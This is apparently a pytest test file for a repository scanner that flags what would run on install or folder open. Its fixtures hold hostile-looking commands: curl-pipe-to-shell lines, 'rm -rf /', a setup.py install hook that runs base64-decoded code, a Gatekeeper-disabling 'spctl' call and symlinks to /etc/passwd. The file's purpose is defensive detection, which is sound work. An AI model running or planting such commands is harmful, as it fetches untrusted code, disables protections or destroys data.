"""Finding what would run: READMEs, Makefiles, Dockerfiles, package files, VS Code files."""

from __future__ import annotations

import json
import os
from pathlib import Path

import pytest

from lookfirst.core.archive import ArchiveLink, ArchiveManifest, SkippedEntry
from lookfirst.static import jsonc
from lookfirst.static.autorun import check_autorun
from lookfirst.static.context import RuleContext
from lookfirst.static.files import read_text
from lookfirst.static.install_paths import _manifest, check_install_paths, make_recipes
from lookfirst.static.model import Collector
from lookfirst.static.readme import install_blocks
from lookfirst.static.shell_rules import ShellAnalyzer


def run(root: Path, *, local: bool = True) -> dict[str, list]:
    out = Collector()
    analyzer = ShellAnalyzer(RuleContext(), out, None)
    check_install_paths(root, None, analyzer, out, local=local)
    check_autorun(root, analyzer, out)
    found: dict[str, list] = {}
    for f in out.findings():
        found.setdefault(f.id.split(".", 1)[1], []).extend(f.evidence)
    return found


def write(root: Path, files: dict[str, str]) -> Path:
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
    return root


def test_readme_blocks_under_install_sections_and_their_subsections() -> None:
    text = (
        "# Tool\n\n```sh\ncurl -s https://a | sh\n```\n\n## Features\n\n```sh\nrm -rf /\n```\n\n"
        "## Installation\n\n### macOS\n\n```bash\nbrew install tool\n```\n\nOr `npm install -g tool`.\n\n"
        "## License\n\n```\nMIT\n```\n"
    )
    blocks = install_blocks(text)
    assert [b.text.strip() for b in blocks] == [
        "curl -s https://a | sh",
        "brew install tool",
        "npm install -g tool",
    ]
    assert blocks[1].line == 18


def test_readme_transcripts_keep_only_prompt_lines() -> None:
    (block,) = install_blocks(
        "## Install\n\n```console\n$ pip install tool\nCollecting tool\n```\n"
    )
    assert block.text.strip() == "pip install tool"


def test_readme_skips_non_shell_and_prose_blocks() -> None:
    assert (
        install_blocks("## Usage\n\n```python\nimport os\n```\n\n```\nsome output text\n```\n")
        == []
    )


def test_makefile_default_and_install_targets() -> None:
    recipes, default = make_recipes(
        ".PHONY: all\nall: build\n\t@echo $$HOME\n\tgcc -o x x.c \\\n\t  -O2\n\ninstall:\n\tcp x $(PREFIX)/bin\n"
    )
    assert default == "all"
    assert recipes["all"] == [(3, "echo $HOME"), (4, "gcc -o x x.c \\\n  -O2")]
    assert recipes["install"] == [(8, "cp x ${PREFIX}/bin")]


def test_files_discovered_and_read(tmp_path: Path) -> None:
    write(
        tmp_path,
        {
            "Makefile": "install:\n\tcurl -s https://a.example/i.sh | sh\n",
            "justfile": "default:\n    curl -s https://b.example/i.sh | sh\n",
            "Dockerfile": 'FROM x\nRUN ["sh", "-c", "curl -s https://c.example/i.sh | sh"]\nRUN --mount=type=cache,target=/c \\\n    curl -s https://d.example/i.sh | sh\n',
            "scripts/install.sh": "curl -s https://e.example/i.sh | sh\n",
            ".envrc": "curl -s https://f.example/i.sh | sh\n",
        },
    )
    found = run(tmp_path)
    sites = {(e.ref, e.line) for e in found["remote_script_unknown_site"]}
    assert sites == {
        ("Makefile", 2),
        ("justfile", 2),
        ("Dockerfile", 2),
        ("Dockerfile", 3),
        ("scripts/install.sh", 1),
        (".envrc", 1),
    }
    assert [e.ref for e in found["autorun_on_open"]] == [".envrc"]


def test_package_json_hooks_bins_and_git_dependencies(tmp_path: Path) -> None:
    write(
        tmp_path,
        {
            "package.json": json.dumps(
                {
                    "name": "w",
                    "bin": {"w": "cli.js"},
                    "scripts": {
                        "postinstall": "node scripts/post.js",
                        "test": "curl -s https://x | sh",
                    },
                    "dependencies": {
                        "a": "^1.0.0",
                        "b": "github:acme/b",
                        "c": "https://x.example/c.tgz",
                        "d": "file:../d",
                    },
                }
            ),
            "scripts/post.js": "const cp = require('child_process'); cp.execSync('curl -s https://g.example/x | sh');\n",
        },
    )
    found = run(tmp_path)
    assert [e.excerpt for e in found["install_hook"]] == ["postinstall: node scripts/post.js"]
    assert found["adds_commands"][0].data["what"] == "w"
    assert {e.excerpt for e in found["custom_package_index"]} == {
        "b: github:acme/b",
        "c: https://x.example/c.tgz",
    }
    assert [(e.ref, e.excerpt) for e in found["remote_script_unknown_site"]] == [
        ("scripts/post.js", "curl -s https://g.example/x | sh")
    ]


def test_setup_py_commands_are_read_with_the_python_parser(tmp_path: Path) -> None:
    write(
        tmp_path,
        {
            "setup.py": (
                "import os, subprocess, base64\nfrom setuptools import setup\nfrom setuptools.command.install import install\n"
                "class Post(install):\n    def run(self):\n        os.system('curl -s https://h.example/x | sh')\n"
                "        subprocess.run(['xattr', '-c', 'App.app'])\n        exec(base64.b64decode('ZWNobw=='))\n"
                "setup(cmdclass={'install': Post})\n"
            )
        },
    )
    found = run(tmp_path)
    assert {e.line for e in found["remote_script_unknown_site"]} == {6}
    assert [e.line for e in found["quarantine_removed"]] == [7]
    assert [e.line for e in found["decode_and_run"]] == [8]
    assert found["install_hook"][0].data["what"] == "custom setup.py commands"


def test_pyproject_hooks_and_requirements(tmp_path: Path) -> None:
    write(
        tmp_path,
        {
            "pyproject.toml": '[build-system]\nbackend-path = ["."]\nbuild-backend = "backend"\n\n[tool.hatch.build.hooks.custom]\npath = "hooks.py"\n',
            "hooks.py": "import os\nos.system('sudo spctl --master-disable')\n",
            "requirements.txt": "-r requirements/base.txt\n-i http://mirror.example/simple\nflask==3.0\n",
            "requirements/base.txt": "--trusted-host mirror.example\n-e git+https://github.com/a/b.git#egg=b\n",
        },
    )
    found = run(tmp_path)
    assert len(found["install_hook"]) == 2
    assert found["gatekeeper_off"][0].ref == "hooks.py"
    assert {(e.ref, e.line) for e in found["custom_package_index"]} == {
        ("requirements.txt", 2),
        ("requirements/base.txt", 1),
        ("requirements/base.txt", 2),
    }
    assert [(e.ref, e.line) for e in found["plain_http"]] == [("requirements.txt", 2)]


def test_vscode_tasks_and_devcontainers(tmp_path: Path) -> None:
    write(
        tmp_path,
        {
            ".vscode/tasks.json": '{\n // comment\n "tasks": [{"label": "a", "command": "npm", "args": ["run", "x"], "runOptions": {"runOn": "folderOpen"}},\n {"label": "b", "command": "make"},],\n}',
            ".devcontainer/devcontainer.json": '{"initializeCommand": ["bash", "init.sh"], "postStartCommand": {"one": "echo 1", "two": "echo 2"}}',
        },
    )
    found = run(tmp_path)
    assert {e.excerpt for e in found["autorun_on_open"]} == {
        "npm run x",
        "bash init.sh",
        "echo 1",
        "echo 2",
    }


def test_jsonc() -> None:
    assert jsonc.loads('{"a": "x // not a comment", /* c */ "b": [1, 2,], // end\n}') == {
        "a": "x // not a comment",
        "b": [1, 2],
    }
    with pytest.raises(ValueError):
        jsonc.loads("{nope}")


def test_links_and_escaping_paths_from_an_archive() -> None:
    manifest = ArchiveManifest(root="pkg-1.0")
    manifest.links = [
        ArchiveLink("pkg-1.0/docs/a.md", "../README.md", "symlink"),
        ArchiveLink("pkg-1.0/evil", "../../../etc/passwd", "symlink"),
        ArchiveLink("pkg-1.0/abs", "/etc/passwd", "symlink"),
    ]
    manifest.skipped = [SkippedEntry("../../x", "path points outside the archive's folder")]
    out = Collector()
    _manifest(manifest, out)
    found: dict[str, list[str]] = {}
    for f in out.findings():
        found.setdefault(f.id, []).extend(e.ref for e in f.evidence)
    assert sorted(found["install_path.outside_link"]) == ["abs", "evil"]
    assert found["install_path.escaping_archive_path"] == ["../../x"]


def test_local_links_out_of_the_folder_are_reported_and_never_read(tmp_path: Path) -> None:
    secret = tmp_path / "secret.txt"
    secret.write_text("TOP SECRET")
    repo = tmp_path / "repo"
    repo.mkdir()
    os.symlink(secret, repo / "README.md")
    os.symlink("README.md", repo / "inside-link.md")
    assert read_text(repo, "README.md") is None
    found = run(repo)
    # inside-link.md points at README.md, which points outside: the chain leaves too
    assert sorted(e.ref for e in found["outside_link"]) == ["README.md", "inside-link.md"]
